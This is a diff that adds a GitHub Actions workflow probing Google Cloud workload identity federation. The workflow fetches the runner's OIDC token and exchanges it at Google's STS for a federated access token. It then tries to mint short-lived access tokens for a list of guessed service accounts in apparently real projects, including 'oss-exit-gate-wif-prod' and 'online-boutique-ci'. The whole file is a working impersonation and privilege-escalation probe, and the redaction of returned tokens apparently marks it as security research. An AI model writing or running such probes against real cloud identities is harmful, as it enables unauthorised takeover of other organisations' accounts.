@@ -1,0 +1,37 @@
+name: wif-probe-actas
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: sts-and-actas-probes
+        run: |
+          set -u
+          PROV="projects/305452601764/locations/global/workloadIdentityPools/builders/providers/github"
+          AUD="//iam.googleapis.com/$PROV"
+          OIDC_RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
+          JWT=$(printf '%s' "$OIDC_RESP" | jq -r .value)
+          STS=$(curl -sS -X POST https://sts.googleapis.com/v1/token -H 'Content-Type: application/json' -d "{\"audience\":\"$AUD\",\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$JWT\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\"}")
+          AT=$(printf '%s' "$STS" | jq -r '.access_token // empty')
+          echo "access_token_len=${#AT}"
+          if [ -z "$AT" ]; then echo "NO_FEDERATED_TOKEN"; exit 0; fi
+          for sa in \
+            "oss-exit-gate@oss-exit-gate-wif-prod.iam.gserviceaccount.com" \
+            "oss-exit-gate-prod@oss-exit-gate-wif-prod.iam.gserviceaccount.com" \
+            "github-actions@oss-exit-gate-wif-prod.iam.gserviceaccount.com" \
+            "github-action-runner@oss-exit-gate-wif-prod.iam.gserviceaccount.com" \
+            "workload-identity@oss-exit-gate-wif-prod.iam.gserviceaccount.com" \
+            "builder@oss-exit-gate-wif-prod.iam.gserviceaccount.com" \
+            "pypi-publisher@oss-exit-gate-wif-prod.iam.gserviceaccount.com" \
+            "oss-exit-gate@oss-exit-gate-prod.iam.gserviceaccount.com" \
+            "github-action-runner@online-boutique-ci.iam.gserviceaccount.com" ; do
+            echo "=== $sa"
+            curl -sS -w '\nHTTP=%{http_code}\n' -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' \
+              -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"300s"}' \
+              "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${sa}:generateAccessToken" | sed -E 's/(accessToken)\":\"[^\"]+\"/\1\":\"REDACTED\"/' | head -c 700
+            echo
+          done
